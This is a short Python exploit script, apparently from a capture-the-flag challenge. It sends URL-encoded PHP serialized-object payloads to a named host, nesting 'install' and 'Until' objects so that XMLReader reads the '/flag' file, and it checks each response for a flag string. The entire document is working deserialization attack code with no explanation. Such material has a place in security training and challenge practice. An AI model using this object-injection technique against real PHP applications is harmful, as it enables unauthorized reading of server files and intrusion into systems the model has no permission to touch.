import requests

# XMLReader payload
xml_urls = [
    ("/flag", "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22XMLReader%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A1%3A%22c%22%3BN%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"),
    ("flag", "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22XMLReader%22%3Bs%3A1%3A%22b%22%3Bs%3A4%3A%22flag%22%3Bs%3A1%3A%22c%22%3BN%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"),
]

print("="*70)
print("Testing XMLReader payloads")
print("="*70)

for path, url in xml_urls:
    print(f"\n{'='*60}")
    print(f"Testing XMLReader with path: {path}")
    print(f"{'='*60}")
    
    try:
        response = requests.get(url, timeout=15)
        print(f"Status Code: {response.status_code}")
        print(f"\nResponse (first 2000 chars):")
        print(response.text[:2000])
        
        # 检查是否包含flag或者错误信息
        if "flag{" in response.text.lower() or "ctf{" in response.text.lower():
            print("\n" + "!"*60)
            print("!!! POTENTIAL FLAG FOUND !!!")
            print("!"*60)
            print(response.text)
            break
        elif "error" in response.text.lower() or "warning" in response.text.lower():
            print("\n[*] Response contains error/warning, may be interesting")
            
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*70)
print("Complete!")
print("="*70)
